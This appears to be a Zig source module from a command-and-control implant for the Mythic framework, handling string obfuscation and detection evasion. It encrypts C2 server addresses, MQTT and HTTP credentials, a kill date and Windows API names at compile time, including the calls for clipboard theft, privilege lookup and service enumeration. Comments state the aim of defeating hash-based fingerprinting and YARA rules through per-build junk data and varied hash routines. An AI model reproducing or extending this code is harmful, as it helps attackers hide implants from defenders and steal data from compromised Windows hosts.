const std    = @import("std");
const config = @import("config");

// ---------------------------------------------------------------------------
// FNV-1a 64-bit hash of the plaintext string.
// Mixed with build_salt so every string gets an independent per-build seed.
// ---------------------------------------------------------------------------
fn stringHash(comptime s: []const u8) u64 {
    var h: u64 = 0xcbf29ce484222325;
    for (s) |c| {
        h ^= c;
        h *%= 0x100000001b3;
    }
    return h;
}

// ---------------------------------------------------------------------------
// Expand a u64 seed to N bytes via splitmix64.
// Used at comptime to derive independent ChaCha20 key + nonce per string.
// ---------------------------------------------------------------------------
fn expandSeed(comptime seed: u64, comptime N: usize) [N]u8 {
    var buf: [N]u8 = undefined;
    var st: u64 = seed;
    var pos: usize = 0;
    while (pos < N) : (pos += 1) {
        if (pos % 8 == 0) {
            st +%= 0x9e3779b97f4a7c15;
            st ^= st >> 30; st *%= 0xbf58476d1ce4e5b9;
            st ^= st >> 27; st *%= 0x94d049bb133111eb; st ^= st >> 31;
        }
        buf[pos] = @truncate(st >> @intCast((pos % 8) * 8));
    }
    return buf;
}

// ---------------------------------------------------------------------------
// Per-build junk blob — pseudo-random data varying in size (128–639 B).
// Changes binary hash, section offsets, and RIP-relative addresses,
// defeating size- and hash-based fingerprinting.
// ---------------------------------------------------------------------------
const junk_size: usize = 128 + @as(usize, @intCast(config.build_salt & 0x1FF));
pub export var _junk: [junk_size]u8 = blk: {
    var blob: [junk_size]u8 = undefined;
    var s: u64 = config.build_salt ^ 0xABCDEF1234567890;
    for (&blob) |*b| {
        s ^= s << 13;
        s ^= s >> 7;
        s ^= s << 17;
        b.* = @truncate(s);
    }
    break :blk blob;
};

// ---------------------------------------------------------------------------
// Enc — ChaCha20-based string obfuscation primitive.
//
// Per-string key (32 B) and nonce (12 B) are derived from
//   seed = build_salt XOR FNV-1a(plaintext)
// via splitmix64 expansion.  Two separate seed inputs are used so key and
// nonce are independent.  ChaCha20's cryptographic keystream means partial
// known-plaintext in string A reveals nothing about string B, and nothing
// about other positions within string A beyond what was already known.
//
// Usage:
//   pub const e_foo = Enc("foo");                    // declare
//   var buf: [obfuscate.e_foo.len]u8 = undefined;   // stack buffer
//   obfuscate.e_foo.dec(&buf);                       // decode at runtime
// ---------------------------------------------------------------------------
pub fn Enc(comptime s: []const u8) type {
    const seed: u64    = comptime config.build_salt ^ stringHash(s);
    const N:    usize  = s.len;
    const chacha_key:   [32]u8 = comptime expandSeed(seed,                      32);
    const chacha_nonce: [12]u8 = comptime expandSeed(seed ^ 0xdeadbeefcafe1234, 12);
    return struct {
        pub const len: usize = N;
        pub const bytes: [N]u8 = blk: {
            var out: [N]u8 = undefined;
            std.crypto.stream.chacha.ChaCha20IETF.xor(&out, s, 0, chacha_key, chacha_nonce);
            break :blk out;
        };
        pub fn dec(buf: *[N]u8) void {
            std.crypto.stream.chacha.ChaCha20IETF.xor(buf, &bytes, 0, chacha_key, chacha_nonce);
        }
    };
}

// encode() — shim returning plain [N]u8 for local one-off uses.
pub fn encode(comptime s: []const u8) [s.len]u8 {
    return Enc(s).bytes;
}

// ---------------------------------------------------------------------------
// Command dispatch hashing — FNV-1a 64-bit.
//
// cmdHash: comptime version for building the dispatch table.
// hashRuntime: runtime version applied to incoming command names.
//
// Using FNV-1a rather than stringHash so the dispatch table constants
// are independent of build_salt — a fixed u64 per command name, not a
// build-varying value that an analyst could correlate with obfuscate.zig.
// ---------------------------------------------------------------------------
pub fn cmdHash(comptime s: []const u8) u64 {
    var h: u64 = 0xcbf29ce484222325;
    for (s) |c| {
        h ^= c;
        h *%= 0x100000001b3;
    }
    return h;
}

pub fn hashRuntime(s: []const u8) u64 {
    // Three build-salt-selected variants — forward for-loop, pointer-walk,
    // and 4x manually unrolled — so YARA rules on the dispatch hash don't
    // match across builds.  All produce identical FNV-1a output.
    if (comptime (config.build_salt >> 16) % 3 == 0) {
        var h: u64 = 0xcbf29ce484222325;
        for (s) |c| { h ^= c; h *%= 0x100000001b3; }
        return h;
    } else if (comptime (config.build_salt >> 16) % 3 == 1) {
        var h: u64 = 0xcbf29ce484222325;
        var p: [*]const u8 = s.ptr;
        const end = s.ptr + s.len;
        while (@intFromPtr(p) < @intFromPtr(end)) : (p += 1) {
            h ^= p[0];
            h *%= 0x100000001b3;
        }
        return h;
    } else {
        var h: u64 = 0xcbf29ce484222325;
        var i: usize = 0;
        while (i + 4 <= s.len) : (i += 4) {
            h ^= s[i];     h *%= 0x100000001b3;
            h ^= s[i + 1]; h *%= 0x100000001b3;
            h ^= s[i + 2]; h *%= 0x100000001b3;
            h ^= s[i + 3]; h *%= 0x100000001b3;
        }
        while (i < s.len) : (i += 1) { h ^= s[i]; h *%= 0x100000001b3; }
        return h;
    }
}

// ---------------------------------------------------------------------------
// C2 infrastructure
// ---------------------------------------------------------------------------

pub const e_mqtt_server_0  = Enc(config.mqtt_server_0);
pub const e_mqtt_server_1  = Enc(config.mqtt_server_1);
pub const e_mqtt_server_2  = Enc(config.mqtt_server_2);
pub const e_mqtt_server_3  = Enc(config.mqtt_server_3);
pub const e_mqtt_topic      = Enc(config.mqtt_topic);
pub const e_mqtt_recv_topic = Enc(config.mqtt_recv_topic);
pub const e_mqtt_send_topic = Enc(config.mqtt_send_topic);
pub const e_mqtt_client_id  = Enc(config.mqtt_client_id);
pub const e_mqtt_user       = Enc(config.mqtt_user);
pub const e_mqtt_pass       = Enc(config.mqtt_pass);
pub const e_http_host       = Enc(config.http_host);
pub const e_http_post_uri   = Enc(config.http_post_uri);
pub const e_http_user_agent = Enc(config.http_user_agent);
pub const e_enc_key_b64     = Enc(config.enc_key);
pub const e_dec_key_b64     = Enc(config.dec_key);

// ---------------------------------------------------------------------------
// Kill date — encoded so it doesn't sit as a plain u64 in .rodata
// ---------------------------------------------------------------------------

const kill_ts_raw: [8]u8 = std.mem.toBytes(config.kill_timestamp);
pub const e_kill_ts = Enc(&kill_ts_raw);

// ---------------------------------------------------------------------------
// Mythic protocol action strings
// ---------------------------------------------------------------------------

pub const e_action        = Enc("action");
pub const e_checkin       = Enc("checkin");
pub const e_get_tasking   = Enc("get_tasking");
pub const e_post_response = Enc("post_response");
pub const e_tasking_size  = Enc("tasking_size");
pub const e_responses     = Enc("responses");
pub const e_uuid          = Enc(config.payload_uuid);

// ---------------------------------------------------------------------------
// Checkin JSON field names
// ---------------------------------------------------------------------------

pub const e_ip       = Enc("ip");
pub const e_os       = Enc("os");
pub const e_user     = Enc("user");
pub const e_host_f   = Enc("host");
pub const e_domain   = Enc("domain");
pub const e_pid_f    = Enc("pid");
pub const e_uuid_f   = Enc("uuid");
pub const e_arch     = Enc("architecture");
pub const e_enc_key  = Enc("encryption_key");
pub const e_dec_key  = Enc("decryption_key");

// ---------------------------------------------------------------------------
// Per-task response field names
// ---------------------------------------------------------------------------

pub const e_task_id     = Enc("task_id");
pub const e_user_output = Enc("user_output");
pub const e_completed   = Enc("completed");
pub const e_status      = Enc("status");
pub const e_socks_f     = Enc("socks");

// ---------------------------------------------------------------------------
// SOCKS relay field names
// ---------------------------------------------------------------------------

pub const e_server_id = Enc("server_id");
pub const e_data_f    = Enc("data");
pub const e_exit_f    = Enc("exit");

// ---------------------------------------------------------------------------
// Download / upload field names
// ---------------------------------------------------------------------------

pub const e_download_f    = Enc("download");
pub const e_upload_f      = Enc("upload");
pub const e_total_chunks  = Enc("total_chunks");
pub const e_chunk_num     = Enc("chunk_num");
pub const e_chunk_data    = Enc("chunk_data");
pub const e_full_path     = Enc("full_path");
pub const e_is_screenshot = Enc("is_screenshot");
pub const e_file_id       = Enc("file_id");
pub const e_chunk_size    = Enc("chunk_size");

// ---------------------------------------------------------------------------
// JSON search keys (field name + surrounding quotes for std.mem.indexOf)
// ---------------------------------------------------------------------------

pub const e_k_tasks        = Enc("\"tasks\"");
pub const e_k_socks        = Enc("\"socks\"");
pub const e_k_command      = Enc("\"command\"");
pub const e_k_parameters   = Enc("\"parameters\"");
pub const e_k_id           = Enc("\"id\"");
pub const e_k_id_colon     = Enc("\"id\":\"");
pub const e_k_server_id    = Enc("\"server_id\"");
pub const e_k_data         = Enc("\"data\"");
pub const e_k_exit         = Enc("\"exit\"");
pub const e_k_total_chunks = Enc("\"total_chunks\"");
pub const e_k_file_id      = Enc("\"file_id\"");
pub const e_k_chunk_data   = Enc("\"chunk_data\"");

// ---------------------------------------------------------------------------
// Windows DLL and API function names (decoded at runtime; not in import table)
// ---------------------------------------------------------------------------

pub const e_dll_user32   = Enc("user32.dll");
pub const e_dll_advapi32 = Enc("advapi32.dll");
// clipboard (user32)
pub const e_fn_OpenClipboard    = Enc("OpenClipboard");
pub const e_fn_GetClipboardData = Enc("GetClipboardData");
pub const e_fn_CloseClipboard   = Enc("CloseClipboard");
// getprivs (advapi32)
pub const e_fn_OpenProcessToken     = Enc("OpenProcessToken");
pub const e_fn_GetTokenInformation  = Enc("GetTokenInformation");
pub const e_fn_LookupPrivilegeNameW = Enc("LookupPrivilegeNameW");
// services (advapi32)
pub const e_fn_OpenSCManagerW     = Enc("OpenSCManagerW");
pub const e_fn_EnumSvcStatusExW   = Enc("EnumServicesStatusExW");
pub const e_fn_CloseServiceHandle = Enc("CloseServiceHandle");

// ---------------------------------------------------------------------------
// Helper: decode an Enc type to a null-terminated stack buffer.
// ---------------------------------------------------------------------------
pub fn decSz(comptime E: type) [E.len + 1]u8 {
    var buf: [E.len + 1]u8 = undefined;
    E.dec(buf[0..E.len]);
    buf[E.len] = 0;
    return buf;
}
